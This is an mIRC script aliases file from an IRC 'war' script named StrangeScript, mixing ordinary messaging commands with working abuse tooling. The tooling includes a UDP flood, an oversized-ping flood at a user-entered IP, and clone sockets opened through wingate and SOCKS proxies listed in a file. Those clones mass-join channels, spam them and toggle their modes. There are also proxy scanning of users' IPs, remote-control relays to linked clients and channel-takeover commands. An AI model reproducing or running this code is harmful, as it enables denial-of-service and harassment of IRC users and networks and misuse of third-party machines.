[aliases]
n0=/msg {
n1=  if ($1 == $null) { $report(Msg,No destination sent).active | halt }
n2=  if ($2 == $null) { $report(Msg,No text sent).active | halt }
n3=  if (=* iswm $1) { msg $1- | return }
n4=  keywrite settings attempt.WHISPER 0
n5=  .raw privmsg $1 : $+ $2-
n6=  if ($show == $true) {
n7=    if ($chr(35) isin $1) && ($chan($1) != $null) { echo -t $1 $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $2- | return }
n8=    if ($chr(35) !isin $1) && ($query($1) != $null) { echo -t $1 $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $2- | return }
n9=    if ($chr(35) !isin $1) && ($query($1) == $null) { $report(Privmsg to $1,$null,--->,$2-).active }
n10=    return 
n11=  }
n12=}
n13=/amsg {
n14=  if ($1 == $null) { $report(Msg,No text sent).active | halt }
n15=  if ($chan(0) < 1) { return }
n16=  var %amsg.count = 1
n17=  while (%amsg.count <= $chan(0)) {
n18=    .raw privmsg $chan(%amsg.count) : $+ $1-
n19=    if ($show == $true) { echo -t $chan(%amsg.count) $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n20=    var %amsg = $addtok(%amsg,$chan(%amsg.count),44)
n21=    inc %amsg.count
n22=    if (%amsg.count > $chan(0)) { break }
n23=  }
n24=  return
n25=}
n26=/me {
n27=  if (=* iswm $active) { describe $active $1- | return }
n28=  .raw privmsg $active : $+ ACTION $1- $+ 
n29=  if ($show == $true) { echo $color(action) -t $active Action:  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n30=  return
n31=}
n32=/ame {
n33=  var %n = 1
n34=  while (%n <= $chan(0)) {
n35=    .raw privmsg $chan(%n) : $+ ACTION $1- $+  
n36=    if ($show == $true) { echo $color(action) -t $chan(%n) Action:  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n37=    inc %n
n38=    if (%n > $chan(0)) { break }
n39=  }
n40=  return
n41=}
n42=/spl {
n43=  if ($master(settings,remotecontrol.send) == ON) {
n44=    var %xXx = 0
n45=    while (%xXx <= 9) {
n46=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd spl $1 }
n47=      inc %xXx
n48=      if (%xXx > 9) { break }
n49=    } 
n50=  }
n51=  if ($1 == OFF) { .timerSPL. $+ $network OFF | $report(Make Split,Split Timer,OFF).active | $report(Make Split,Final room count,%spl.count,rooms in,$duration($calc($ctime - %spl.start))).active | unset %spl.count %spl.start %splgo.count | return }
n52=  if ($1 == COUNT) { $report(Make Split,Current room count,%spl.count,rooms in,$duration($calc($ctime - %spl.start))).active | return }
n53=  if ($1 != $null) {
n54=    if ($1 !isnum) { $report(Make Split,$null,$null,The param must be a munber in seconds, between room joins,You sent ,$1).active | return }
n55=    if ($timer(spl. [ $+ [ $network ] ] ).com != $null) { .timerSPL. $+ $network 0 $1 splgo | $report(Make Split,Split Timer,Active,Updating to,$1, seconds).active | return }
n56=    if ($timer(spl. [ $+ [ $network ] ] ).com == $null) { set %spl.count 0 | set %spl.start $ctime | .timerSPL. $+ $network 0 $1 splgo | $report(Make Split,Split Timer,Activated,Using delay,$1, seconds).active | return }
n57=  }
n58=  else {
n59=    if ($timer(spl. [ $+ [ $network ] ] ).com != $null) { $report(Make Split,Split timer,Active,With a delay of,$timer(spl. [ $+ [ $network ] ] ).delay).active }
n60=    if ($timer(spl. [ $+ [ $network ] ] ).com == $null) { $report(Make Split,$null,$null,$null,Split timer is not active).active }
n61=    $report(Make Split,$null,$null,You must include "seconds between sends" on the command line.).active
n62=    return
n63=  }
n64=}
n65=/saysplit { msg # $report(Split Channels,$null,$null,$null,%split.chan) }
n66=/splgo {
n67=  var %tmp11 1
n68=  while (%tmp11 <= $sock(*,0)) {
n69=    if (@Boom isin $sock(*,%tmp11)) || (@Gate isin $sock(*,%tmp11)) || (@Split isin $sock(*,%tmp11)) {
n70=      var %test $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999)
n71=      sockwrite -n $sock(*,%tmp11) join %test
n72=      sockwrite -n $sock(*,%tmp11) part %test
n73=      inc %spl.count 10
n74=    }
n75=    inc %tmp11
n76=    if (%tmp11 > $sock(*,0)) { break }
n77=  }
n78=  $report(Make Split,%spl.count,$duration($calc($ctime - %spl.start)),Per Minute,$round($calc(%spl.count / (($ctime - %spl.start) / 60)),0)).status
n79=}
n80=/newkey return StrangeScript $+ $chr(91) $+ $rand(0,99999) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(0,99999) $+ $chr(93)
n81=/addkey {
n82=  if ($key(settings,rumble) == ON) { return }
n83=  ;if ($key(settings,ircx) == OFF) { return }
n84=  if ($1 == $null) {
n85=    if ($key(#,deop) == ON) { .raw prop # ownerkey : $+ $key(#,ownerkey)  }
n86=    elseif ($key(#,deop) == PROTECT) { .raw prop # ownerkey : $+ $key(#,ownerkey)  }
n87=    else { keywrite # ownerkey $newkey | .raw prop # ownerkey : $+ $key(#,ownerkey) }
n88=  }
n89=  if ($1 != $null) {
n90=    if ($key($1,deop) == ON) { .raw prop $1 ownerkey : $+ $key($1,ownerkey)  }
n91=    elseif ($key($1,deop) == PROTECT) { .raw prop $1 ownerkey : $+ $key($1,ownerkey)  }
n92=    else { keywrite $1 ownerkey $newkey | .raw prop $1 ownerkey : $+ $key($1,ownerkey) }
n93=  }
n94=  return
n95=}
n96=/addme {
n97=  if ($key(settings,rumble) == ON) { return }
n98=  if ($key(settings,ircx) == OFF) { return }
n99=  if ($1 == $null) { .raw access # add owner $address($me,4) 0 : $+ $ver }
n100=  else {
n101=    if ($1 == all) { addme.all }
n102=    else { .raw access $1 add owner $address($me,4) 0 : $+ $ver }
n103=  }
n104=}
n105=/addme2 {
n106=  if ($key(settings,rumble) == ON) { return }
n107=  if ($key(settings,ircx) == OFF) { return }
n108=  if ($1 == $null) { .raw access # add host $address($me,4) 0 : $+ $ver }
n109=  else {
n110=    if ($1 == all) { addme.all }
n111=    else { .raw access $1 add host $address($me,4) 0 : $+ $ver }
n112=  }
n113=}
n114=/addme.all {
n115=  if ($key(settings,rumble) == ON) { return }
n116=  if ($key(settings,ircx) == OFF) { return }
n117=  var %tmp. 1
n118=  while (%tmp.adjust <= $chan(0)) {
n119=    if ($nick($chan(%tmp.adjust),$me,q) != $null) { addme $chan(%tmp.adjust) }
n120=    if ($nick($chan(%tmp.adjust),$me,o) != $null) { addme2 $chan(%tmp.adjust) }
n121=    inc %tmp.adjust
n122=    if (%tmp.adjust > $chan(0)) { break }
n123=  }
n124=}
n125=/cyc {
n126=  if ($1 == OFF) { timerCYC off | return }
n127=  if ($1 == $null) {
n128=    var %tmp.cyc $$?="Seconds between sends"
n129=    var %tmp.cyc1 %tmp.cyc $?!="Do you want it to cycle?"
n130=    var %tmp.cyc3 $?="What Channel? $+ $cr $+ OK for Current"
n131=    if (%tmp.cyc3 == $null) { var %tmp.cyc3 = # }
n132=    timerCYC 0 %tmp.cyc cyc %tmp.cyc1 %tmp.cyc3
n133=  }
n134=  if ($1 != $null) {
n135=    if ($2 == $true) {
n136=      var %tmp.cf 1
n137=      while (%tmp.cf <= $sock(*,0)) {
n138=        if ( @Boom isin $sock(*,%tmp.cf)) || (@Gate isin $sock(*,%tmp.cf)) || (@Split isin $sock(*,%tmp.cf)) { sockwrite -n $sock(*,%tmp.cf) join $3 $+ $cr $+ privmsg $3 : $+  $+ $rand(0,15) $+ $str(XoX,130) $+ $cr $+ part $3 }
n139=        inc %tmp.cf
n140=        if (%tmp.cf > $sock(*,0)) { break }
n141=      }
n142=    }
n143=  }
n144=  if ($2 == $false) {
n145=    var %tmp.cf 1
n146=    while (%tmp.cf <= $sock(*,0)) {
n147=      sockwrite -n $sock(*,%tmp.cf) privmsg $3 : $+  $+ $rand(0,15) $+ $str(SeX,130)
n148=      inc %tmp.cf
n149=      if (%tmp.cf > $sock(*,0)) { break }
n150=    }
n151=  }
n152=}
n153=/boot { raw mode # -o-o-o-o-o-o $1 $1 $1 $1 $1 $1 $+ $cr $+ kick # $1 SpakkerHead }
n154=/blitz { .raw part # $crlf join # $crlf part # $crlf join # $crlf part # $crlf join # $crlf part # $crlf join # $key(#,ownerkey) }
n155=sysop.menu { return SysOp Menu }
n156=/dos { if ($OS == XP) || ($os == 2K) { run cmd.exe } | else { run command.com } }
n157=/telnet {
n158=  if ($1 == $null) {
n159=    var %ttmp = $input(IP to telnet to?,egi,StrangeScript needs input,127.0.0.1)
n160=    if (%ttmp == $null) { halt }
n161=    run telnet %ttmp
n162=  }
n163=  else { run telnet $1- }
n164=}
n165=/http { www $1- }
n166=/www {
n167=  ;if ($1 == $null) {
n168=  ;  var %htmp = $input(IP to telnet to?,egi,StrangeScript needs input,127.0.0.1)
n169=  ;  if (%htmp == $null) { halt }
n170=  ;  run %htmp
n171=  ;}
n172=  if (http* !isin $1-) {
n173=    if (*www* !isin $1-) { run http://www. $+ $1- } 
n174=    { run http:// $+ $1- | halt }
n175=  }
n176=}
n177=/ftp {
n178=  if ($1 == $null) {
n179=    var %ttmp = $input(IP to ftp to?,egi,StrangeScript needs input,127.0.0.1)
n180=    if (%ttmp == $null) { halt }
n181=    run ftp %ttmp
n182=  }
n183=  else { run ftp $1- }
n184=}
n185=/udp.flood { sockudp -nk * $1 $rand(1,5000) ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| }
n186=/script.play {
n187=  if ($master(settings,script.sound) != ON) { return }
n188=  if ($right($1-,3) == wav) {
n189=    if ($inwave != $true) { splay -w $1- }
n190=  }
n191=  if ($right($1-,3) == mp3) || ($right($1-,3) == wma) {
n192=    if ($insong != $true) { splay -p $1- }
n193=  }
n194=  ;$report(Playing a *. $+ $upper($right($1,3)) sound file).status
n195=  return
n196=}
n197=/unshit {
n198=  keywrite settings shithead ""
n199=  keywrite settings shitheadlast ""
n200=  rumble OFF
n201=  $report(ShitList,CLEAR,$null,The list has been cleared).active
n202=  if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n203=  if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n204=}
n205=/shit {
n206=  if ($key(settings,shitheadlast) == $null) { 
n207=    $report(Last ShitList,EMPTY,$null,No action taken).active
n208=    if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n209=    if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n210=    rumble OFF
n211=    return
n212=  }
n213=  if ($key(settings,shitheadlast) != $null) { 
n214=    keywrite settings shithead $remtok($key(settings,shithead),$key(settings,shitheadlast),1,44)
n215=    $report(Last ShitList,REMOVE,$null,The ip $key(settings,shitheadlast) was removed).active
n216=    if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n217=    if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n218=    keywrite settings shitheadlast ""
n219=    rumble OFF
n220=    return
n221=  }
n222=}
n223=/split.flood {
n224=  if ($1 == $null) { $report(ERROR in Split.Flood).active | return }
n225=  set %tmp.splitflood 1
n226=  while (%tmp.splitflood <= $sock(*,0)) {
n227=    if (%tmp.splitflood.tic == ON) { set %tmp.splitflood.tic OFF }
n228=    else { set %tmp.splitflood.tic ON }
n229=    if (%tmp.splitflood.tic == OFF) { set %tmp.splitflood.say mode $1 +ntsuw }
n230=    else { set %tmp.splitflood.say mode $1 -ntuw }
n231=    sockwrite -n $sock(*,%tmp.splitflood) %tmp.splitflood.say
n232=    inc %tmp.splitflood
n233=    if (%tmp.splitflood > $sock(*,0)) { break }
n234=  }
n235=  unset %tmp.splitflood %tmp.splitflood
n236=}
n237=/link {
n238=  if ($1 == $null) { set %tmp.link $$?="Nick or IP to link with" }
n239=  if ($1 == $null) && (%tmp.link == $null) { return }
n240=  if ($1 != $null) { set %tmp.link $1- }
n241=  ctcp %tmp.link MultiLink $$?="Password for Link"
n242=  unset %tmp.link
n243=}
n244=/RC.Clear { unset %remote.control* | setupshow RC nicks ALL cleared. | return }
n245=/nick.check {
n246=  if ($key(settings,beme) == ON) {
n247=    if ($key(settings,savednick1) != $null) && ($me != $key(settings,savednick1)) { if ($key(settings,recover) == $null) { recover $key(settings,savednick1) | return } }
n248=  }
n249=  return
n250=}
n251=/launch {
n252=  boom
n253=  .timer 1 30 gate
n254=}
n255=/alt.fix {
n256=  if ($1 != ALL) {
n257=    if ($1 !isnum) { return }
n258=  }
n259=  if ($1 == ALL) {
n260=    if ($1 isnum) { return }
n261=  }
n262=}
n263=/fix {
n264=  if ($1 != $null) {
n265=    $report(Socket Fix,$null,$null,Closing $1 Remote Connection, Window and resetting Variables).status
n266=    if (@Boom !isin $1) && (@Gate !isin $1) { $report(Socket Fix,ERROR,$null,Incorrect command given $1- must be @BoomNUM or @gateNUM).active | return }
n267=    sockclose $1
n268=    window -c $1
n269=    if (@Boom !isin $1) {
n270=      keywrite settings boom.sock.chan
n271=      keywrite settings boom.sock.nick
n272=      unset %boom.server [ $+ [ $1 ] ]
n273=    }
n274=    if (@Gate !isin $1) {
n275=      keywrite settings clone.sock.chan
n276=      keywrite settings clone.sock.nick
n277=      unset %clone.server [ $+ [ $1 ] ]
n278=    }
n279=    return
n280=  }
n281=  if ($1 == $null) {
n282=    $report(Socket Fix,$null,$null,Closing all Boom and Gate Remote Connections).status
n283=    sockclose @Boom*
n284=    sockclose @Gate*
n285=    keywrite settings boom.sock.chan
n286=    keywrite settings boom.sock.nick
n287=    keywrite settings clone.sock.chan
n288=    keywrite settings clone.sock.nick
n289=    unset %boom.server*
n290=    unset %clone.server*
n291=    var %tmp = 1
n292=    while (%tmp <= 999) {
n293=      window -c @Boom [ $+ [ %tmp ] ]
n294=      window -c @Gate [ $+ [ %tmp ] ]
n295=      inc %tmp
n296=      if (%tmp > 999) { break }
n297=    }
n298=  }
n299=  if ($master(settings,remotecontrol.send) == ON) {
n300=    var %xXx = 0
n301=    while (%xXx <= 9) {
n302=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd fix $1 }
n303=      inc %xXx
n304=      if (%xXx > 9) { break }
n305=    } 
n306=  }
n307=  return
n308=}
n309=/boom {
n310=  var %tmp.1 $1 , %tmp.2 $2 , %tmp.3 $3
n311=  if (%tmp.1 != $null) && (%tmp.1 !isnum) && (%tmp.2 == $null) { var %tmp.1 3 | var %tmp.2 cos.selfip.biz }
n312=  if (%tmp.1 == $null) { var %tmp.1 2 }
n313=  if (%tmp.2 == $null) { var %tmp.2 $serverip }
n314=  if (%tmp.3 == $null) { var %tmp.3 6667 }
n315=  var %tmp.boom.count 1
n316=  while (%tmp.boom.count <= %tmp.1) {
n317=    if ($sock(@Boom [ $+ [ %tmp.boom.count ] ] ).name == $null) { sockopen @Boom [ $+ [ %tmp.boom.count ] ] %tmp.2 %tmp.3 }
n318=    inc %tmp.boom.count
n319=    if (%tmp.boom.count > %tmp.1) { break }
n320=  }
n321=  if ($master(settings,remotecontrol.send) == ON) {
n322=    var %xXx 0
n323=    while (%xXx <= 9) {
n324=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd boom %tmp.1 }
n325=      inc %xXx
n326=      if (%xXx > 9) { break }
n327=    } 
n328=  }
n329=  return
n330=}
n331=/Gate.alt {
n332=  set %gate.load $read(Gates.txt,n,$1)
n333=  var %cloneload 1
n334=  $report(Begining @Gate socket load of line $1 %gate.load).active
n335=  ;while (%cloneload <= 1) {
n336=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name != $null) { inc %CloneNum }
n337=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 23 }
n338=  inc %CloneNum
n339=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 1080 }
n340=  inc %CloneNum
n341=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 80 }
n342=  inc %CloneNum
n343=  if (%CloneNum > 999) { set %CloneNum 1 }
n344=  inc %cloneload
n345=  if (%cloneload > 1) { break }
n346=  ;}
n347=  $report(Done,$null,$null,Please wait for sockets to load).active
n348=}
n349=/gate {
n350=  ;set %bah.load $lines(Gates.txt)
n351=  if ($1 == $null) { set %CloneNum 1 | var %gatenext 1, %gateloop = $calc(%gatenext +9) }
n352=  if ($1 != $null) { var %gatenext $1 | var %gateloop $calc(%gatenext +9) }
n353=  :next
n354=  while (%gatenext <= %gateloop) {
n355=    .timergate $+ %gatenext 1 $calc(%gatenext * 4) gate.alt %gatenext
n356=    inc %gatenext
n357=    if (%gatenext > %gateloop) { break }
n358=    if (%gatenext > $lines(Gates.txt)) { break }
n359=  }
n360=  set %CloneNum1
n361=  return
n362=}
n363=Parsme {
n364=  if ($window(@NumParse) == $null) { window -l @NumParse 0 408 800 100 @NumParse Arial 12 bold }
n365=  var %pi = 1
n366=  while ($gettok(%Parse,%pi,32) != $null) {
n367=    var %Parsed = %Parsed 10 $+ $chr(91) $+ 04Param $+ %pi $+ : 09 $+ $gettok(%Parse,%pi,32) $+ 10 $+ $chr(93)
n368=    inc %pi
n369=    if ($gettok(%Parse,%pi,32) == $null) { break }
n370=  }
n371=  aline @NumParse %ParseNum %Parsed 
n372=  sline @NumParse $line(@NumParse,0)
n373=}
n374=/dping {
n375=  if ($1 == $null) { run ping -t -l 65500 -v 8 -w 100 $$?="Enter IP to flood:" }
n376=  else { run ping -t -l 65500 -v 8 -w 100 $1 }
n377=}
n378=/end {
n379=  if ($1 == $null) { $report(No range given. /end 1 2 3 or /end 1-21).active | return }
n380=  set %tmp.end $1-
n381=  if ($chr(45) isin %tmp.end) { goto range }
n382=  set %tmp.end.count 1
n383=  while (%tmp.end.count <= $numtok(%tmp.end,32)) {
n384=    stop $gettok(%tmp.end,%tmp.end.count,32)
n385=    inc %tmp.end.count
n386=    if (%tmp.end.count > $numtok(%tmp.end,32)) { break }
n387=  }
n388=  unset %tmp.end %tmp.end.count
n389=  return
n390=  :range
n391=  set %tmp.end $gettok(%tmp.end,1,32)
n392=  set %tmp.end.count $remove($left(%tmp.end,$pos(%tmp.end,-,1)),-)
n393=  while (%tmp.end.count <= $remove($right(%tmp.end,$pos(%tmp.end,-,1)),-)) {
n394=    stop %tmp.end.count
n395=    inc %tmp.end.count
n396=    if (%tmp.end.count > $remove($right(%tmp.end,$pos(%tmp.end,-,1)),-)) { break }
n397=  }
n398=  unset %tmp.end %tmp.end.count
n399=  if ($numtok($1-,32) > 1) { .timer 1 0 end $2- }
n400=}
n401=/so { msg # $report(Sockets's Open,$null,$sock(*,0),$null,$sock(@Boom*,0), Booms, $sock(@Gate*,0), Gates,$sock(@Split*,0), Splits,$calc($sock(*,0) - ($sock(@Boom*,0) + $sock(@Gate*,0) + $sock(@Split*,0))), others) }
n402=/insta.aj {
n403=  $report(Insta-AutoJoin,$null,$null,Creating your autojoin list).active
n404=  var %tmp.iaj = 1
n405=  var %tmp.iaj1 = ""
n406=  while (%tmp.iaj <= $chan(0)) {
n407=    var %tmp.iaj1 = $addtok(%tmp.iaj1,$chan(%tmp.iaj),44)
n408=    $report(Insta-AutoJoin,$null,Adding,$null,$chan(%tmp.iaj)).active
n409=    inc %tmp.iaj
n410=    if (%tmp.iaj > $chan(0)) { break }
n411=  }
n412=  keywrite settings autojoinrooms %tmp.iaj1
n413=  $report(Insta-AutoJoin,$null,Done,%tmp.iaj1).active
n414=}
n415=/reup { set %split.dc off | server internal $1 }
n416=/kall {
n417=  msg # $1-
n418=  var %tmp.kall = 1
n419=  set %tmp.kst ""
n420=  while (%tmp.kall <= $ialchan($1,#,0)) {
n421=    if ($ialchan($1,#,%tmp.kall).nick != $me) { set %tmp.kst $addtok(%tmp.kst,$ialchan($1,#,%tmp.kall).nick,44) }
n422=    inc %tmp.kall
n423=    if (%tmp.kall > $ialchan($1,#,0)) { break }
n424=  }
n425=  if ($2 == BAN) {
n426=    if ($key(settings,rumble) == ON) { .access # add deny $1 0 : $+ $ver }
n427=    else { .ban # $1 }
n428=  }
n429=  msg # Fix this /kall code it sucks ass
n430=  ;.kick # %tmp.kst $1 $+ $chr(160) $+ $chr(160) $+ 10 $+ ( $+ 00Ban $+ 10 $+ )
n431=  ;else { .kick # %tmp.kst $1 $+ $chr(160) $+ 10 $+ ( $+ 00Kick $+ 10 $+ ) }
n432=  unset %tmp.kst
n433=  return
n434=}
n435=/adjust {
n436=  if ($key(settings,rumble) == ON) { return }
n437=  clearial
n438=  var %tmp.adjust = 1
n439=  while (%tmp.adjust <= $chan(0)) {
n440=    if ($me isop $chan(%tmp.adjust)) { .who $chan(%tmp.adjust) }
n441=    ;if ($me isop $chan(%tmp.adjust)) && ($nick($chan(%tmp.adjust),0) < 200) { .who $chan(%tmp.adjust) }
n442=    inc %tmp.adjust
n443=    if (%tmp.adjust > $chan(0)) { break }
n444=  }
n445=  $report(IAL,$null,Auto,Updating,All Op Channels).status
n446=  ;.timerlogcolor. $+ $network 1 10 login.color.nick
n447=  .timerMASTER. $+ $network 1 10 auto.master
n448=}
n449=/sl { socklist }
n450=/sc { sockclose $1- }
n451=weapons { if ($exists($mircdirwar) == $true) { return Weapons } }
n452=/scan {
n453=  if ($1 == $me) { halt }
n454=  if ($1 == $null) { $report(Please include the nick and IP /scan <nick> <IP>).active | halt }
n455=  if ($2 == $null) { $report(Please include the nick and IP /scan <nick> <IP>).active | halt }
n456=  if ($chr(64) isin $2) {  
n457=    set %Gate.Usera [ $+ [ %Gate.Scaning.count ] ] $1 $gettok($2,2,64)
n458=    sockopen @sockchecka [ $+ [ %Gate.Scaning.count ] ] $gettok($2,2,64) 1080
n459=    set %Gate.Userb [ $+ [ %Gate.Scaning.count ] ] $1 $gettok($2,2,64)
n460=    sockopen @sockcheckb [ $+ [ %Gate.Scaning.count ] ] $gettok($2,2,64) 23
n461=  }
n462=  if ($chr(64) !isin $2) {  
n463=    set %Gate.Usera [ $+ [ %Gate.Scaning.count ] ] $1 $2
n464=    sockopen @sockchecka [ $+ [ %Gate.Scaning.count ] ] $2 1080
n465=    set %Gate.Userb [ $+ [ %Gate.Scaning.count ] ] $1 $2
n466=    sockopen @sockcheckb [ $+ [ %Gate.Scaning.count ] ] $2 23
n467=  }
n468=  .timerGATEAC $+ %Gate.Scaning.count 1 30 /sockclose @sockchecka [ $+ [ %Gate.Scaning.count ] ]
n469=  .timerGATEAV $+ %Gate.Scaning.count 1 30 /unset %Gate.Usera [ $+ [ %Gate.Scaning.count ] ]
n470=  .timerGATEBC $+ %Gate.Scaning.count 1 30 /sockclose @sockcheckb [ $+ [ %Gate.Scaning.count ] ]
n471=  .timerGATEBV $+ %Gate.Scaning.count 1 30 /unset %Gate.Userb [ $+ [ %Gate.Scaning.count ] ]
n472=  inc %Gate.Scaning.count
n473=  if (%Gate.Scaning.count > 999) { set %Gate.Scaning.count 0 | halt }
n474=}
n475=/system { msg # $report(System Info,Windows $os) $report($null,CPU: 1400 mhz) }
n476=/unkill { keywrite settings killonops.chan "" | keywrite settings killonops.nick "" | $report(Kill,$null,Cleared,$null,Your kill alias has been cleared).active }
n477=custom.filter {
n478=  if ($gettok(%custom.filter,1,44) != $null) && (* $+ $gettok(%custom.filter,1,44) $+ * iswm $strip($1-)) { return $true }
n479=  elseif ($gettok(%custom.filter,2,44) != $null) && (* $+ $gettok(%custom.filter,2,44) $+ * iswm $strip($1-)) { return $true }
n480=  elseif ($gettok(%custom.filter,3,44) != $null) && (* $+ $gettok(%custom.filter,3,44) $+ * iswm $strip($1-)) { return $true }
n481=  elseif ($gettok(%custom.filter,4,44) != $null) && (* $+ $gettok(%custom.filter,4,44) $+ * iswm $strip($1-)) { return $true }
n482=  elseif ($gettok(%custom.filter,5,44) != $null) && (* $+ $gettok(%custom.filter,5,44) $+ * iswm $strip($1-)) { return $true }
n483=  elseif ($gettok(%custom.filter,6,44) != $null) && (* $+ $gettok(%custom.filter,6,44) $+ * iswm $strip($1-)) { return $true }
n484=  elseif ($gettok(%custom.filter,7,44) != $null) && (* $+ $gettok(%custom.filter,7,44) $+ * iswm $strip($1-)) { return $true }
n485=  elseif ($gettok(%custom.filter,8,44) != $null) && (* $+ $gettok(%custom.filter,8,44) $+ * iswm $strip($1-)) { return $true }
n486=  elseif ($gettok(%custom.filter,9,44) != $null) && (* $+ $gettok(%custom.filter,9,44) $+ * iswm $strip($1-)) { return $true }
n487=  else { return $false }
n488=}
n489=ChitChat {
n490=  if ($key(settings,chitchat) == ON) {
n491=    if ($window(@ChitChat) == $null) { window @ChitChat @ChitChat }
n492=    echo -t @ChitChat On $network in $2 $+ , $1 said: $3-
n493=  }
n494=  return
n495=}
n496=/bnc {
n497=  if ($1 != $null) { masterwrite settings bnc.server $1- }
n498=  if ($master(settings,bnc.ip) == $null) { masterwrite settings bnc.ip $input(Enter the BNC IP you want  to connect to,egi,StrangeScript needs input,127.0.0.1) }
n499=  if ($master(settings,bnc.port) == $null) { masterwrite settings bnc.port $input(Enter the BNC Port to connect on,egi,StrangeScript needs input,6667) }
n500=  if ($master(settings,bnc.vhost) == $null) { masterwrite settings bnc.vhost $input(Enter the VHost to use,egi,StrangeScript needs input) }
n501=  if ($master(settings,bnc.keepalive) == $null) { masterwrite settings bnc.keepalive $input(Enable keepalive?,ygi,StrangeScript needs input) }
n502=  if ($master(settings,bnc.pass) == $null) { masterwrite settings bnc.pass $input(Enter the BNC password,pgi,StrangeScript needs input) }
n503=  if ($master(settings,bnc.server) == $null) { masterwrite settings bnc.server $input(Enter the server to head to with the BNC,egi,StrangeScript needs input,127.0.0.1) }
n504=  server $master(settings,bnc.ip) $master(settings,bnc.port)
n505=  $report(Use /bnc2 to send codes and connect info).active
n506=}
n507=/bnc2 {
n508=  if ($master(settings,bnc.use) != ON) { return }
n509=  raw pass $master(settings,bnc.pass)
n510=  if ($master(settings,bnc.keepalive) == $true) { raw keepalive }
n511=  raw vip $master(settings,bnc.vhost)
n512=  raw conn $master(settings,bnc.server)
n513=}
n514=/BNC.Server {
n515=  set %BNC.version StrangeBNC v 1.6
n516=  if ($1 == INFO) {
n517=    var %tmp.b = $sock(BNCUSER*,0)
n518=    if (%tmp.b == $null) { var %tmp.b = 0 }
n519=    $report(BNC,INFO,$null,$null,Listing Information for %BNC.version).active
n520=    $report(BNC,INFO,$null,$null,There is currently %tmp.b connection(s) to the BNC server.).active
n521=    var %tmp.bnci = 1
n522=    while (%tmp.bnci <= $sock(BNCUSER*,0)) {
n523=      $report(BNC,INFO,User %tmp.bnci,%BNC.nick [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ,%BNC.user [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ).active
n524=      $report(BNC,INFO,User %tmp.bnci,Connected to %BNC.server [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ).active
n525=      inc %tmp.bnci
n526=      if (%tmp.bnci > $sock(BNCUSER*,0)) { break }
n527=    }
n528=    return
n529=  }
n530=  if ($master(settings,Sbnc.active) == $null) { masterwrite settings Sbnc.active OFF | setupshow BNC Server offline }
n531=  if ($master(settings,Sbnc.port) == $null) { masterwrite settings Sbnc.port 1000 | setupshow BNC Port $master(settings,Sbnc.port) }
n532=  if ($master(settings,Sbnc.active) == ON) { if ($sock(BNCS) == $null) { socklisten BNCS $master(settings,Sbnc.port) } | set %BNC.count 1 }
n533=  if ($master(settings,Sbnc.active) == OFF) { sockclose BNCS* | sockclose BNCUSER* | sockclose BNCRELAY* | unset %BNC.nick* %BNC.user* %BNC.pass* %BNC.authed* %BNC.level* }
n534=  return
n535=}
